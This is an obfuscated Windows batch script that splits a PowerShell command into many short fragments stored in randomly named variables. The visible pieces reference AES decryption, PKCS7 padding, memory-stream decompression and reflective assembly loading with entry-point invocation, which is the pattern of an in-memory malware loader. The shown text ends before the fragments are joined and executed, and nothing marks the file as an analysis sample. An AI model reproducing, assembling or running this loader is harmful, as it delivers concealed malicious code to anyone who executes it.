@echo off
set "baoqwClfjn='[-1"
set "JeSGQDJBfv=tryP"
set "kXgvfpChle=ment"
set "KTefPQgstu=gjUV"
set "DNoTOjPfRI=$NOL"
set "NpmxHDIpra=kP.D"
set "RMeuNzWWoM=$CSC"
set "WrubBghPxr=, (,"
set "AHzaDmBzgP=F'[-"
set "iYKZXagxEO=em.C"
set "uasHKCXujj=Invo"
set "AfXEbJJurK=$dWR"
set "zVXQXisOcK=CSCr"
set "kobdZhdPsL=)($V"
set "MEanGthrUb=::('"
set "SgIALVCbMN=PxEW"
set "azDCckVVuq=e = "
set "KBqiLmgOvi=rity"
set "XYCRAExNXL=-joi"
set "BzmqQBqCUf=O.Me"
set "JIQNGxIrDG=LKS."
set "aiKKZePAse=LKS "
set "RBNacVEsJK=Bmor"
set "hzwhTBwQRj=;$nU"
set "szkHcoayZK=ress"
set "rzNhzAzKSt= = N"
set "yvtxYRXrGB= '')"
set "YqAZtVdDKk=S46e"
set "dgzBfxkqlq=($WW"
set "RuNxZtYOhy=Stre"
set "wMnJrxSMoZ=Disp"
set "iGALrFgGcz=.-16"
set "mizFjsllFB=ect "
set "vCDLpPiMNT=comm"
set "TQHptYlILS=yste"
set "megJnkCZTn=7;$P"
set "csKEnRKvpL=  $k"
set "SbvJwlFxQB=.Dis"
set "vmRQGSfanQ=k; }"
set "gmpvuzcdDE=[-1."
set "gsiAmsnsLc=pose"
set "fuKVFAMvly=Obje"
set "lUhuaLLACs=.Sec"
set "PCcWzlklVK=:('g"
set "CBuvlJxxDr=New-"
set "OvJLtCAJhT=pres"
set "lNuxnXznwf=.Cop"
set "XbGVWTRCuI=brea"
set "QHKoeXyeQm=rtS4"
set "jnhiIMKVDp=UV.T"
set "FhFWMBDQIo=Comp"
set "KYlCcAJKLZ=fwXM"
set "SAfcPmjxfM=e]::"
set "KLmseHVDHt=vert"
set "ECMcuArwCy=ring"
set "DlkLeOhvYO= if "
set "hIKDawFilS=mory"
set "FMKkxMfXGk=lBlo"
set "sEMGGHmvIJ=ewLi"
set "oEvhbFNnpd=ecry"
set "ddmRmJbEvZ=t Sy"
set "XmXJfyTpvI=.Key"
set "JleYbWCBDB=fwXM"
set "CxpCnVJjcc=$JZc"
set "tWdbvPzUUi=d;$P"
set "jrkygjeMQC=LB ="
set "dSnvKfmclr=('%*'"
set "rwCsMjualy=iron"
set "BAyPEErrrj=tem."
set "rcDnAgXyxM=CrB."
set "pnuOVZcHJN=.Cry"
set "rONicqTvsr=fwXM"
set "oCMvTcwwoF=Secu"
set "CYcJIlNmtF== $P"
set "bdzFaxdvVJ=gjYA"
set "yHASzEmhzO= [Sy"
set "TGgzGJtLaN=V = "
set "JnEjFpIgXQ=VrCL"
set "EcGHKNOVhQ= [st"
set "tERnNTStjZ=ptog"
set "DzpJvxrKkH=sion"
set "LCglrURdyr=n ''"
set "azpaKXyweE=ct S"
set "tuvwvVUgnp=fwXM"
set "ywKmTeWQBx=tem."
set "IFsJIyfXJI=zuZI"
set "xdqtKwESSz=Rlw."
set "tpYeDqsVNN=in $"
set "rhKKJiohue=$hgj"
set "LgbmRMZWdA=ress"
set "QGBpUJyJRH=.Ass"
set "iVzTDcGpcx=ress"
set "BFNnFhMpXA=bjec"
set "fpDyXYRPNK=($WW"
set "jPLVztITtX=);$P"
set "joDyfXznoP=:: '"
set "eIQGFcfIWk=rity"
set "plomrEdEof=and "
set "cPStEgDrOY='0Pg"
set "PqYfVfVakh=M.Pa"
set "tbFTLdjpUx=$hgj"
set "wIhnvdUYyo=, $V"
set "JhQpkhizhG=Star"
set "xNULtBcEvF=raph"
set "LPaTQdtlin=tsWi"
set "qaPBOuFZyc=ateD"
set "nrHrmAjFKb=JZck"
set "sQoYwFEPsD=KyDp"
set "ZUFoNobbbc=KS.T"
set "AGmisdkLuK=yTo("
set "kUkSLOtvPF= = ["
set "hwDTDjzhlo=)($k"
set "dZZQKODOhl=.Len"
set "YlXNxJBCLu=esaB"
set "ziKTdgMuQz=oin "
set "QsHhYHdwDG=)) {"
set "SuxPWtvwOd=rofi"
set "DUFVGdYmVx=[Sys"
set "sctQyAgGRd=gnir"
set "aPMBlgKcvR=ddin"
set "FfckwKmxiA='txe"
set "rhAyRyFxnR=m.Re"
set "nfPqpsFTIb=();$"
set "TywPUyaQel=SJF "
set "PiqQeVylVT=tion"
set "kacgFzctlv=L4Yi"
set "mZJYGvSusk=] -j"
set "NsNFNkusCe=Obje"
set "KAHJBwdBGw=flec"
set "TnqAFAiuPX=3); "
set "TxknZJqkxq=am;$"
set "wBVDxTUrpQ=]::("
set "lRxuazVRbI=th('"
set "HwXkbWgBBG=raph"
set "XhuthaiYAU=y.Pa"
set "ZQWrNTIomR=Mode"
set "WOhUIugndG='gni"
set "yDYytkHKMo=ke($"
set "odJIZRGZsC=LY);"
set "nRLcMtqqic=ose("
set "TYhZihWpFg=::De"
set "sHJhncQPNv=;$NO"
set "KBPKIlPMKB=morF"
set "NjNsqjDyQu=urit"
set "jtegtCVcNS=ct S"
set "iDBoSDTCwt=Syst"
set "mZIpDzeDZv=();$"
set "ijtUdsXoMw=tS46"
set "kWzJwVaSwQ=eam("
set "fqBiAhMOqx=P = "
set "dWYFVbTgVs=[Sys"
set "REsMEPnWDz=-nop"
set "vlkNEQgjOA=;$Oc"
set "LpwziIsCSl=se()"
set "ubLQxZPPrB=[IO."
set "GhWIvQbnXN=ion."
set "vKIJHHuvXJ=;$NO"
set "qNIpYRFIGn=n ''"
set "yZmFupoCtA=F.En"
set "jTjLxKzNbr=em.I"
set "ZLDStESaKy=ne);"
set "npxTipEYJG=stem"
set "mKunoiWSRA=ypto"
set "EgCyVJTJqL=-1.."
set "jJmcoyQRLE=ptor"
set "rWSJZJWzSs=UHLn"
set "GhuUdWLymP=oryS"
set "JkBGFXbcjR=dj0C"
set "XCTaOLWmfC=yste"
set "vqCSnjxocJ=.Com"
set "XhNRZiRJuW=y]::"
set "NdqZrIBmqG=pher"
set "aahplasUoU=UV);"
set "zIQScSjvVK=Y, 0"
set "LUTpZSJvYU=PKCS"
set "iOjFVjcMHD=]::N"
set "nLHpwOeijD=nage"
set "qNtAbmnzrC=HLn."
set "EgXsxTkqws= = $"
set "QComMRtNSI=comp"
set "wNTCRqutKb=g = "
set "MPooaILiZb=);$h"
set "AqNLGSFefw=File"
set "IKxUTtKHta=stem"
set "yajtKIVCWf=$Pfw"
set "HWRanxGuPm=nirt"
set "tMEvATqjMY=gMod"
set "aSMRUylXBW=ionM"
set "gItIfGkzPy=ach "
set "ETGtxCFOxR=form"
set "WTqgOafqOC=gth)"
set "wFPdceSlQL=[Sys"
set "QdhkYeXIxc=.Cre"
set "CuGSTewLaJ=PTtG"
set "gYXQgcOzeh=esMa"
set "CyXCFVpTVO=rB, "
set "BIvlzEqMbL= = $"
set "cvfDiqZpGy=gsYZ"
set "ObCjxGOdav=$VrC"
set "rmDkcPNsQn=onve"
set "DucKSLNKII=;$CS"
set "fOvdKYaPgh=.IO."
